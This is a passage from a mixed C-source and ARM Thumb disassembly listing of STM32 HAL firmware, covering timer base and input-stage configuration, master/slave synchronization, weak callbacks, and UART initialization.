 80051cc:	d00b      	beq.n	80051e6 <TIM_Base_SetConfig+0x52>
 80051ce:	687b      	ldr	r3, [r7, #4]
 80051d0:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 80051d4:	d007      	beq.n	80051e6 <TIM_Base_SetConfig+0x52>
 80051d6:	687b      	ldr	r3, [r7, #4]
 80051d8:	4a1e      	ldr	r2, [pc, #120]	; (8005254 <TIM_Base_SetConfig+0xc0>)
 80051da:	4293      	cmp	r3, r2
 80051dc:	d003      	beq.n	80051e6 <TIM_Base_SetConfig+0x52>
 80051de:	687b      	ldr	r3, [r7, #4]
 80051e0:	4a1d      	ldr	r2, [pc, #116]	; (8005258 <TIM_Base_SetConfig+0xc4>)
 80051e2:	4293      	cmp	r3, r2
 80051e4:	d108      	bne.n	80051f8 <TIM_Base_SetConfig+0x64>
  {
    /* Set the clock division */
    tmpcr1 &= ~TIM_CR1_CKD;
 80051e6:	68fb      	ldr	r3, [r7, #12]
 80051e8:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 80051ec:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= (uint32_t)Structure->ClockDivision;
 80051ee:	683b      	ldr	r3, [r7, #0]
 80051f0:	68db      	ldr	r3, [r3, #12]
 80051f2:	68fa      	ldr	r2, [r7, #12]
 80051f4:	4313      	orrs	r3, r2
 80051f6:	60fb      	str	r3, [r7, #12]
  }

  /* Set the auto-reload preload */
  MODIFY_REG(tmpcr1, TIM_CR1_ARPE, Structure->AutoReloadPreload);
 80051f8:	68fb      	ldr	r3, [r7, #12]
 80051fa:	f023 0280 	bic.w	r2, r3, #128	; 0x80
 80051fe:	683b      	ldr	r3, [r7, #0]
 8005200:	695b      	ldr	r3, [r3, #20]
 8005202:	4313      	orrs	r3, r2
 8005204:	60fb      	str	r3, [r7, #12]

  TIMx->CR1 = tmpcr1;
 8005206:	687b      	ldr	r3, [r7, #4]
 8005208:	68fa      	ldr	r2, [r7, #12]
 800520a:	601a      	str	r2, [r3, #0]

  /* Set the Autoreload value */
  TIMx->ARR = (uint32_t)Structure->Period ;
 800520c:	683b      	ldr	r3, [r7, #0]
 800520e:	689a      	ldr	r2, [r3, #8]
 8005210:	687b      	ldr	r3, [r7, #4]
 8005212:	62da      	str	r2, [r3, #44]	; 0x2c

  /* Set the Prescaler value */
  TIMx->PSC = Structure->Prescaler;
 8005214:	683b      	ldr	r3, [r7, #0]
 8005216:	681a      	ldr	r2, [r3, #0]
 8005218:	687b      	ldr	r3, [r7, #4]
 800521a:	629a      	str	r2, [r3, #40]	; 0x28

  if (IS_TIM_REPETITION_COUNTER_INSTANCE(TIMx))
 800521c:	687b      	ldr	r3, [r7, #4]
 800521e:	4a0c      	ldr	r2, [pc, #48]	; (8005250 <TIM_Base_SetConfig+0xbc>)
 8005220:	4293      	cmp	r3, r2
 8005222:	d007      	beq.n	8005234 <TIM_Base_SetConfig+0xa0>
 8005224:	687b      	ldr	r3, [r7, #4]
 8005226:	4a0b      	ldr	r2, [pc, #44]	; (8005254 <TIM_Base_SetConfig+0xc0>)
 8005228:	4293      	cmp	r3, r2
 800522a:	d003      	beq.n	8005234 <TIM_Base_SetConfig+0xa0>
 800522c:	687b      	ldr	r3, [r7, #4]
 800522e:	4a0a      	ldr	r2, [pc, #40]	; (8005258 <TIM_Base_SetConfig+0xc4>)
 8005230:	4293      	cmp	r3, r2
 8005232:	d103      	bne.n	800523c <TIM_Base_SetConfig+0xa8>
  {
    /* Set the Repetition Counter value */
    TIMx->RCR = Structure->RepetitionCounter;
 8005234:	683b      	ldr	r3, [r7, #0]
 8005236:	691a      	ldr	r2, [r3, #16]
 8005238:	687b      	ldr	r3, [r7, #4]
 800523a:	631a      	str	r2, [r3, #48]	; 0x30
  }

  /* Generate an update event to reload the Prescaler
     and the repetition counter (only for advanced timer) value immediately */
  TIMx->EGR = TIM_EGR_UG;
 800523c:	687b      	ldr	r3, [r7, #4]
 800523e:	2201      	movs	r2, #1
 8005240:	615a      	str	r2, [r3, #20]
}
 8005242:	bf00      	nop
 8005244:	3714      	adds	r7, #20
 8005246:	46bd      	mov	sp, r7
 8005248:	f85d 7b04 	ldr.w	r7, [sp], #4
 800524c:	4770      	bx	lr
 800524e:	bf00      	nop
 8005250:	40012c00 	.word	0x40012c00
 8005254:	40014000 	.word	0x40014000
 8005258:	40014400 	.word	0x40014400

0800525c <TIM_TI1_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI1_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 800525c:	b480      	push	{r7}
 800525e:	b087      	sub	sp, #28
 8005260:	af00      	add	r7, sp, #0
 8005262:	60f8      	str	r0, [r7, #12]
 8005264:	60b9      	str	r1, [r7, #8]
 8005266:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 1: Reset the CC1E Bit */
  tmpccer = TIMx->CCER;
 8005268:	68fb      	ldr	r3, [r7, #12]
 800526a:	6a1b      	ldr	r3, [r3, #32]
 800526c:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC1E;
 800526e:	68fb      	ldr	r3, [r7, #12]
 8005270:	6a1b      	ldr	r3, [r3, #32]
 8005272:	f023 0201 	bic.w	r2, r3, #1
 8005276:	68fb      	ldr	r3, [r7, #12]
 8005278:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 800527a:	68fb      	ldr	r3, [r7, #12]
 800527c:	699b      	ldr	r3, [r3, #24]
 800527e:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC1F;
 8005280:	693b      	ldr	r3, [r7, #16]
 8005282:	f023 03f0 	bic.w	r3, r3, #240	; 0xf0
 8005286:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 4U);
 8005288:	687b      	ldr	r3, [r7, #4]
 800528a:	011b      	lsls	r3, r3, #4
 800528c:	693a      	ldr	r2, [r7, #16]
 800528e:	4313      	orrs	r3, r2
 8005290:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC1E Bit */
  tmpccer &= ~(TIM_CCER_CC1P | TIM_CCER_CC1NP);
 8005292:	697b      	ldr	r3, [r7, #20]
 8005294:	f023 030a 	bic.w	r3, r3, #10
 8005298:	617b      	str	r3, [r7, #20]
  tmpccer |= TIM_ICPolarity;
 800529a:	697a      	ldr	r2, [r7, #20]
 800529c:	68bb      	ldr	r3, [r7, #8]
 800529e:	4313      	orrs	r3, r2
 80052a0:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1;
 80052a2:	68fb      	ldr	r3, [r7, #12]
 80052a4:	693a      	ldr	r2, [r7, #16]
 80052a6:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 80052a8:	68fb      	ldr	r3, [r7, #12]
 80052aa:	697a      	ldr	r2, [r7, #20]
 80052ac:	621a      	str	r2, [r3, #32]
}
 80052ae:	bf00      	nop
 80052b0:	371c      	adds	r7, #28
 80052b2:	46bd      	mov	sp, r7
 80052b4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80052b8:	4770      	bx	lr

080052ba <TIM_TI2_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI2_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 80052ba:	b480      	push	{r7}
 80052bc:	b087      	sub	sp, #28
 80052be:	af00      	add	r7, sp, #0
 80052c0:	60f8      	str	r0, [r7, #12]
 80052c2:	60b9      	str	r1, [r7, #8]
 80052c4:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 2: Reset the CC2E Bit */
  tmpccer = TIMx->CCER;
 80052c6:	68fb      	ldr	r3, [r7, #12]
 80052c8:	6a1b      	ldr	r3, [r3, #32]
 80052ca:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC2E;
 80052cc:	68fb      	ldr	r3, [r7, #12]
 80052ce:	6a1b      	ldr	r3, [r3, #32]
 80052d0:	f023 0210 	bic.w	r2, r3, #16
 80052d4:	68fb      	ldr	r3, [r7, #12]
 80052d6:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 80052d8:	68fb      	ldr	r3, [r7, #12]
 80052da:	699b      	ldr	r3, [r3, #24]
 80052dc:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC2F;
 80052de:	693b      	ldr	r3, [r7, #16]
 80052e0:	f423 4370 	bic.w	r3, r3, #61440	; 0xf000
 80052e4:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 12U);
 80052e6:	687b      	ldr	r3, [r7, #4]
 80052e8:	031b      	lsls	r3, r3, #12
 80052ea:	693a      	ldr	r2, [r7, #16]
 80052ec:	4313      	orrs	r3, r2
 80052ee:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC2E Bit */
  tmpccer &= ~(TIM_CCER_CC2P | TIM_CCER_CC2NP);
 80052f0:	697b      	ldr	r3, [r7, #20]
 80052f2:	f023 03a0 	bic.w	r3, r3, #160	; 0xa0
 80052f6:	617b      	str	r3, [r7, #20]
  tmpccer |= (TIM_ICPolarity << 4U);
 80052f8:	68bb      	ldr	r3, [r7, #8]
 80052fa:	011b      	lsls	r3, r3, #4
 80052fc:	697a      	ldr	r2, [r7, #20]
 80052fe:	4313      	orrs	r3, r2
 8005300:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1 ;
 8005302:	68fb      	ldr	r3, [r7, #12]
 8005304:	693a      	ldr	r2, [r7, #16]
 8005306:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 8005308:	68fb      	ldr	r3, [r7, #12]
 800530a:	697a      	ldr	r2, [r7, #20]
 800530c:	621a      	str	r2, [r3, #32]
}
 800530e:	bf00      	nop
 8005310:	371c      	adds	r7, #28
 8005312:	46bd      	mov	sp, r7
 8005314:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005318:	4770      	bx	lr

0800531a <TIM_ITRx_SetConfig>:
  *            @arg TIM_TS_TI2FP2: Filtered Timer Input 2
  *            @arg TIM_TS_ETRF: External Trigger input
  * @retval None
  */
static void TIM_ITRx_SetConfig(TIM_TypeDef *TIMx, uint32_t InputTriggerSource)
{
 800531a:	b480      	push	{r7}
 800531c:	b085      	sub	sp, #20
 800531e:	af00      	add	r7, sp, #0
 8005320:	6078      	str	r0, [r7, #4]
 8005322:	6039      	str	r1, [r7, #0]
  uint32_t tmpsmcr;

  /* Get the TIMx SMCR register value */
  tmpsmcr = TIMx->SMCR;
 8005324:	687b      	ldr	r3, [r7, #4]
 8005326:	689b      	ldr	r3, [r3, #8]
 8005328:	60fb      	str	r3, [r7, #12]
  /* Reset the TS Bits */
  tmpsmcr &= ~TIM_SMCR_TS;
 800532a:	68fb      	ldr	r3, [r7, #12]
 800532c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005330:	60fb      	str	r3, [r7, #12]
  /* Set the Input Trigger source and the slave mode*/
  tmpsmcr |= (InputTriggerSource | TIM_SLAVEMODE_EXTERNAL1);
 8005332:	683a      	ldr	r2, [r7, #0]
 8005334:	68fb      	ldr	r3, [r7, #12]
 8005336:	4313      	orrs	r3, r2
 8005338:	f043 0307 	orr.w	r3, r3, #7
 800533c:	60fb      	str	r3, [r7, #12]
  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 800533e:	687b      	ldr	r3, [r7, #4]
 8005340:	68fa      	ldr	r2, [r7, #12]
 8005342:	609a      	str	r2, [r3, #8]
}
 8005344:	bf00      	nop
 8005346:	3714      	adds	r7, #20
 8005348:	46bd      	mov	sp, r7
 800534a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800534e:	4770      	bx	lr

08005350 <TIM_ETR_SetConfig>:
  *          This parameter must be a value between 0x00 and 0x0F
  * @retval None
  */
void TIM_ETR_SetConfig(TIM_TypeDef *TIMx, uint32_t TIM_ExtTRGPrescaler,
                       uint32_t TIM_ExtTRGPolarity, uint32_t ExtTRGFilter)
{
 8005350:	b480      	push	{r7}
 8005352:	b087      	sub	sp, #28
 8005354:	af00      	add	r7, sp, #0
 8005356:	60f8      	str	r0, [r7, #12]
 8005358:	60b9      	str	r1, [r7, #8]
 800535a:	607a      	str	r2, [r7, #4]
 800535c:	603b      	str	r3, [r7, #0]
  uint32_t tmpsmcr;

  tmpsmcr = TIMx->SMCR;
 800535e:	68fb      	ldr	r3, [r7, #12]
 8005360:	689b      	ldr	r3, [r3, #8]
 8005362:	617b      	str	r3, [r7, #20]

  /* Reset the ETR Bits */
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 8005364:	697b      	ldr	r3, [r7, #20]
 8005366:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 800536a:	617b      	str	r3, [r7, #20]

  /* Set the Prescaler, the Filter value and the Polarity */
  tmpsmcr |= (uint32_t)(TIM_ExtTRGPrescaler | (TIM_ExtTRGPolarity | (ExtTRGFilter << 8U)));
 800536c:	683b      	ldr	r3, [r7, #0]
 800536e:	021a      	lsls	r2, r3, #8
 8005370:	687b      	ldr	r3, [r7, #4]
 8005372:	431a      	orrs	r2, r3
 8005374:	68bb      	ldr	r3, [r7, #8]
 8005376:	4313      	orrs	r3, r2
 8005378:	697a      	ldr	r2, [r7, #20]
 800537a:	4313      	orrs	r3, r2
 800537c:	617b      	str	r3, [r7, #20]

  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 800537e:	68fb      	ldr	r3, [r7, #12]
 8005380:	697a      	ldr	r2, [r7, #20]
 8005382:	609a      	str	r2, [r3, #8]
}
 8005384:	bf00      	nop
 8005386:	371c      	adds	r7, #28
 8005388:	46bd      	mov	sp, r7
 800538a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800538e:	4770      	bx	lr

08005390 <HAL_TIMEx_MasterConfigSynchronization>:
  *         mode.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIMEx_MasterConfigSynchronization(TIM_HandleTypeDef *htim,
                                                        const TIM_MasterConfigTypeDef *sMasterConfig)
{
 8005390:	b480      	push	{r7}
 8005392:	b085      	sub	sp, #20
 8005394:	af00      	add	r7, sp, #0
 8005396:	6078      	str	r0, [r7, #4]
 8005398:	6039      	str	r1, [r7, #0]
  assert_param(IS_TIM_MASTER_INSTANCE(htim->Instance));
  assert_param(IS_TIM_TRGO_SOURCE(sMasterConfig->MasterOutputTrigger));
  assert_param(IS_TIM_MSM_STATE(sMasterConfig->MasterSlaveMode));

  /* Check input state */
  __HAL_LOCK(htim);
 800539a:	687b      	ldr	r3, [r7, #4]
 800539c:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 80053a0:	2b01      	cmp	r3, #1
 80053a2:	d101      	bne.n	80053a8 <HAL_TIMEx_MasterConfigSynchronization+0x18>
 80053a4:	2302      	movs	r3, #2
 80053a6:	e04f      	b.n	8005448 <HAL_TIMEx_MasterConfigSynchronization+0xb8>
 80053a8:	687b      	ldr	r3, [r7, #4]
 80053aa:	2201      	movs	r2, #1
 80053ac:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  /* Change the handler state */
  htim->State = HAL_TIM_STATE_BUSY;
 80053b0:	687b      	ldr	r3, [r7, #4]
 80053b2:	2202      	movs	r2, #2
 80053b4:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Get the TIMx CR2 register value */
  tmpcr2 = htim->Instance->CR2;
 80053b8:	687b      	ldr	r3, [r7, #4]
 80053ba:	681b      	ldr	r3, [r3, #0]
 80053bc:	685b      	ldr	r3, [r3, #4]
 80053be:	60fb      	str	r3, [r7, #12]

  /* Get the TIMx SMCR register value */
  tmpsmcr = htim->Instance->SMCR;
 80053c0:	687b      	ldr	r3, [r7, #4]
 80053c2:	681b      	ldr	r3, [r3, #0]
 80053c4:	689b      	ldr	r3, [r3, #8]
 80053c6:	60bb      	str	r3, [r7, #8]

  /* If the timer supports ADC synchronization through TRGO2, set the master mode selection 2 */
  if (IS_TIM_TRGO2_INSTANCE(htim->Instance))
 80053c8:	687b      	ldr	r3, [r7, #4]
 80053ca:	681b      	ldr	r3, [r3, #0]
 80053cc:	4a21      	ldr	r2, [pc, #132]	; (8005454 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 80053ce:	4293      	cmp	r3, r2
 80053d0:	d108      	bne.n	80053e4 <HAL_TIMEx_MasterConfigSynchronization+0x54>
  {
    /* Check the parameters */
    assert_param(IS_TIM_TRGO2_SOURCE(sMasterConfig->MasterOutputTrigger2));

    /* Clear the MMS2 bits */
    tmpcr2 &= ~TIM_CR2_MMS2;
 80053d2:	68fb      	ldr	r3, [r7, #12]
 80053d4:	f423 0370 	bic.w	r3, r3, #15728640	; 0xf00000
 80053d8:	60fb      	str	r3, [r7, #12]
    /* Select the TRGO2 source*/
    tmpcr2 |= sMasterConfig->MasterOutputTrigger2;
 80053da:	683b      	ldr	r3, [r7, #0]
 80053dc:	685b      	ldr	r3, [r3, #4]
 80053de:	68fa      	ldr	r2, [r7, #12]
 80053e0:	4313      	orrs	r3, r2
 80053e2:	60fb      	str	r3, [r7, #12]
  }

  /* Reset the MMS Bits */
  tmpcr2 &= ~TIM_CR2_MMS;
 80053e4:	68fb      	ldr	r3, [r7, #12]
 80053e6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80053ea:	60fb      	str	r3, [r7, #12]
  /* Select the TRGO source */
  tmpcr2 |=  sMasterConfig->MasterOutputTrigger;
 80053ec:	683b      	ldr	r3, [r7, #0]
 80053ee:	681b      	ldr	r3, [r3, #0]
 80053f0:	68fa      	ldr	r2, [r7, #12]
 80053f2:	4313      	orrs	r3, r2
 80053f4:	60fb      	str	r3, [r7, #12]

  /* Update TIMx CR2 */
  htim->Instance->CR2 = tmpcr2;
 80053f6:	687b      	ldr	r3, [r7, #4]
 80053f8:	681b      	ldr	r3, [r3, #0]
 80053fa:	68fa      	ldr	r2, [r7, #12]
 80053fc:	605a      	str	r2, [r3, #4]

  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 80053fe:	687b      	ldr	r3, [r7, #4]
 8005400:	681b      	ldr	r3, [r3, #0]
 8005402:	4a14      	ldr	r2, [pc, #80]	; (8005454 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 8005404:	4293      	cmp	r3, r2
 8005406:	d009      	beq.n	800541c <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 8005408:	687b      	ldr	r3, [r7, #4]
 800540a:	681b      	ldr	r3, [r3, #0]
 800540c:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8005410:	d004      	beq.n	800541c <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 8005412:	687b      	ldr	r3, [r7, #4]
 8005414:	681b      	ldr	r3, [r3, #0]
 8005416:	4a10      	ldr	r2, [pc, #64]	; (8005458 <HAL_TIMEx_MasterConfigSynchronization+0xc8>)
 8005418:	4293      	cmp	r3, r2
 800541a:	d10c      	bne.n	8005436 <HAL_TIMEx_MasterConfigSynchronization+0xa6>
  {
    /* Reset the MSM Bit */
    tmpsmcr &= ~TIM_SMCR_MSM;
 800541c:	68bb      	ldr	r3, [r7, #8]
 800541e:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 8005422:	60bb      	str	r3, [r7, #8]
    /* Set master mode */
    tmpsmcr |= sMasterConfig->MasterSlaveMode;
 8005424:	683b      	ldr	r3, [r7, #0]
 8005426:	689b      	ldr	r3, [r3, #8]
 8005428:	68ba      	ldr	r2, [r7, #8]
 800542a:	4313      	orrs	r3, r2
 800542c:	60bb      	str	r3, [r7, #8]

    /* Update TIMx SMCR */
    htim->Instance->SMCR = tmpsmcr;
 800542e:	687b      	ldr	r3, [r7, #4]
 8005430:	681b      	ldr	r3, [r3, #0]
 8005432:	68ba      	ldr	r2, [r7, #8]
 8005434:	609a      	str	r2, [r3, #8]
  }

  /* Change the htim state */
  htim->State = HAL_TIM_STATE_READY;
 8005436:	687b      	ldr	r3, [r7, #4]
 8005438:	2201      	movs	r2, #1
 800543a:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 800543e:	687b      	ldr	r3, [r7, #4]
 8005440:	2200      	movs	r2, #0
 8005442:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return HAL_OK;
 8005446:	2300      	movs	r3, #0
}
 8005448:	4618      	mov	r0, r3
 800544a:	3714      	adds	r7, #20
 800544c:	46bd      	mov	sp, r7
 800544e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005452:	4770      	bx	lr
 8005454:	40012c00 	.word	0x40012c00
 8005458:	40014000 	.word	0x40014000

0800545c <HAL_TIMEx_CommutCallback>:
  * @brief  Hall commutation changed callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_CommutCallback(TIM_HandleTypeDef *htim)
{
 800545c:	b480      	push	{r7}
 800545e:	b083      	sub	sp, #12
 8005460:	af00      	add	r7, sp, #0
 8005462:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_CommutCallback could be implemented in the user file
   */
}
 8005464:	bf00      	nop
 8005466:	370c      	adds	r7, #12
 8005468:	46bd      	mov	sp, r7
 800546a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800546e:	4770      	bx	lr

08005470 <HAL_TIMEx_BreakCallback>:
  * @brief  Hall Break detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_BreakCallback(TIM_HandleTypeDef *htim)
{
 8005470:	b480      	push	{r7}
 8005472:	b083      	sub	sp, #12
 8005474:	af00      	add	r7, sp, #0
 8005476:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_BreakCallback could be implemented in the user file
   */
}
 8005478:	bf00      	nop
 800547a:	370c      	adds	r7, #12
 800547c:	46bd      	mov	sp, r7
 800547e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005482:	4770      	bx	lr

08005484 <HAL_TIMEx_Break2Callback>:
  * @brief  Hall Break2 detection callback in non blocking mode
  * @param  htim: TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_Break2Callback(TIM_HandleTypeDef *htim)
{
 8005484:	b480      	push	{r7}
 8005486:	b083      	sub	sp, #12
 8005488:	af00      	add	r7, sp, #0
 800548a:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function Should not be modified, when the callback is needed,
            the HAL_TIMEx_Break2Callback could be implemented in the user file
   */
}
 800548c:	bf00      	nop
 800548e:	370c      	adds	r7, #12
 8005490:	46bd      	mov	sp, r7
 8005492:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005496:	4770      	bx	lr

08005498 <HAL_UART_Init>:
  *        parameters in the UART_InitTypeDef and initialize the associated handle.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_UART_Init(UART_HandleTypeDef *huart)
{
 8005498:	b580      	push	{r7, lr}
 800549a:	b082      	sub	sp, #8
 800549c:	af00      	add	r7, sp, #0
 800549e:	6078      	str	r0, [r7, #4]
  /* Check the UART handle allocation */
  if (huart == NULL)
 80054a0:	687b      	ldr	r3, [r7, #4]
 80054a2:	2b00      	cmp	r3, #0
 80054a4:	d101      	bne.n	80054aa <HAL_UART_Init+0x12>
  {
    return HAL_ERROR;
 80054a6:	2301      	movs	r3, #1
 80054a8:	e040      	b.n	800552c <HAL_UART_Init+0x94>
  {
    /* Check the parameters */
    assert_param((IS_UART_INSTANCE(huart->Instance)) || (IS_LPUART_INSTANCE(huart->Instance)));
  }

  if (huart->gState == HAL_UART_STATE_RESET)
 80054aa:	687b      	ldr	r3, [r7, #4]
 80054ac:	6fdb      	ldr	r3, [r3, #124]	; 0x7c
 80054ae:	2b00      	cmp	r3, #0
 80054b0:	d106      	bne.n	80054c0 <HAL_UART_Init+0x28>
  {
    /* Allocate lock resource and initialize it */
    huart->Lock = HAL_UNLOCKED;
 80054b2:	687b      	ldr	r3, [r7, #4]
 80054b4:	2200      	movs	r2, #0
 80054b6:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

    /* Init the low level hardware */
    huart->MspInitCallback(huart);
#else
    /* Init the low level hardware : GPIO, CLOCK */
    HAL_UART_MspInit(huart);
 80054ba:	6878      	ldr	r0, [r7, #4]
 80054bc:	f7fb fd78 	bl	8000fb0 <HAL_UART_MspInit>
#endif /* (USE_HAL_UART_REGISTER_CALLBACKS) */
  }

  huart->gState = HAL_UART_STATE_BUSY;
 80054c0:	687b      	ldr	r3, [r7, #4]
 80054c2:	2224      	movs	r2, #36	; 0x24
 80054c4:	67da      	str	r2, [r3, #124]	; 0x7c

  __HAL_UART_DISABLE(huart);
 80054c6:	687b      	ldr	r3, [r7, #4]
 80054c8:	681b      	ldr	r3, [r3, #0]
 80054ca:	681a      	ldr	r2, [r3, #0]
 80054cc:	687b      	ldr	r3, [r7, #4]
 80054ce:	681b      	ldr	r3, [r3, #0]
 80054d0:	f022 0201 	bic.w	r2, r2, #1
 80054d4:	601a      	str	r2, [r3, #0]

  /* Perform advanced settings configuration */
  /* For some items, configuration requires to be done prior TE and RE bits are set */
  if (huart->AdvancedInit.AdvFeatureInit != UART_ADVFEATURE_NO_INIT)
 80054d6:	687b      	ldr	r3, [r7, #4]
 80054d8:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80054da:	2b00      	cmp	r3, #0
 80054dc:	d002      	beq.n	80054e4 <HAL_UART_Init+0x4c>
  {
    UART_AdvFeatureConfig(huart);
 80054de:	6878      	ldr	r0, [r7, #4]
 80054e0:	f000 fa54 	bl	800598c <UART_AdvFeatureConfig>
  }

  /* Set the UART Communication parameters */
  if (UART_SetConfig(huart) == HAL_ERROR)
 80054e4:	6878      	ldr	r0, [r7, #4]
 80054e6:	f000 f825 	bl	8005534 <UART_SetConfig>
 80054ea:	4603      	mov	r3, r0
 80054ec:	2b01      	cmp	r3, #1
 80054ee:	d101      	bne.n	80054f4 <HAL_UART_Init+0x5c>
  {
    return HAL_ERROR;
 80054f0:	2301      	movs	r3, #1
 80054f2:	e01b      	b.n	800552c <HAL_UART_Init+0x94>
  }

  /* In asynchronous mode, the following bits must be kept cleared:
  - LINEN and CLKEN bits in the USART_CR2 register,
  - SCEN, HDSEL and IREN  bits in the USART_CR3 register.*/
  CLEAR_BIT(huart->Instance->CR2, (USART_CR2_LINEN | USART_CR2_CLKEN));
 80054f4:	687b      	ldr	r3, [r7, #4]
 80054f6:	681b      	ldr	r3, [r3, #0]
 80054f8:	685a      	ldr	r2, [r3, #4]
 80054fa:	687b      	ldr	r3, [r7, #4]
 80054fc:	681b      	ldr	r3, [r3, #0]
 80054fe:	f422 4290 	bic.w	r2, r2, #18432	; 0x4800
 8005502:	605a      	str	r2, [r3, #4]
  CLEAR_BIT(huart->Instance->CR3, (USART_CR3_SCEN | USART_CR3_HDSEL | USART_CR3_IREN));
 8005504:	687b      	ldr	r3, [r7, #4]
 8005506:	681b      	ldr	r3, [r3, #0]
 8005508:	689a      	ldr	r2, [r3, #8]
 800550a:	687b      	ldr	r3, [r7, #4]
 800550c:	681b      	ldr	r3, [r3, #0]
 800550e:	f022 022a 	bic.w	r2, r2, #42	; 0x2a
 8005512:	609a      	str	r2, [r3, #8]

  __HAL_UART_ENABLE(huart);
 8005514:	687b      	ldr	r3, [r7, #4]
 8005516:	681b      	ldr	r3, [r3, #0]
 8005518:	681a      	ldr	r2, [r3, #0]
 800551a:	687b      	ldr	r3, [r7, #4]
 800551c:	681b      	ldr	r3, [r3, #0]
 800551e:	f042 0201 	orr.w	r2, r2, #1
 8005522:	601a      	str	r2, [r3, #0]

  /* TEACK and/or REACK to check before moving huart->gState and huart->RxState to Ready */
  return (UART_CheckIdleState(huart));
 8005524:	6878      	ldr	r0, [r7, #4]
 8005526:	f000 fad3 	bl	8005ad0 <UART_CheckIdleState>
 800552a:	4603      	mov	r3, r0
}
 800552c:	4618      	mov	r0, r3
 800552e:	3708      	adds	r7, #8
 8005530:	46bd      	mov	sp, r7
 8005532:	bd80      	pop	{r7, pc}

08005534 <UART_SetConfig>:
  * @brief Configure the UART peripheral.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_SetConfig(UART_HandleTypeDef *huart)
{
 8005534:	e92d 4fb0 	stmdb	sp!, {r4, r5, r7, r8, r9, sl, fp, lr}
 8005538:	b08a      	sub	sp, #40	; 0x28
 800553a:	af00      	add	r7, sp, #0
 800553c:	60f8      	str	r0, [r7, #12]
  uint32_t tmpreg;
  uint16_t brrtemp;
  UART_ClockSourceTypeDef clocksource;
  uint32_t usartdiv;
  HAL_StatusTypeDef ret               = HAL_OK;
 800553e:	2300      	movs	r3, #0
 8005540:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  *  the UART Word Length, Parity, Mode and oversampling:
  *  set the M bits according to huart->Init.WordLength value
  *  set PCE and PS bits according to huart->Init.Parity value
  *  set TE and RE bits according to huart->Init.Mode value
